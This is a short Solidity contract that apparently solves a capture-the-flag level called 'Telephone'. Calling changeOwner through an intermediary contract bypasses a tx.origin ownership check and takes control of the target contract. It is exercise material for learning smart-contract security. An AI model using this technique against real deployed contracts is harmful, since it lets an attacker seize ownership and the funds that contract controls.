// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./telephone.sol";

contract telephoneAttak {
    Telephone public telephone;

    constructor (address _telephone) {
        telephone = Telephone(_telephone);
    }

    function attak() public {
        telephone.changeOwner(msg.sender);
    }

}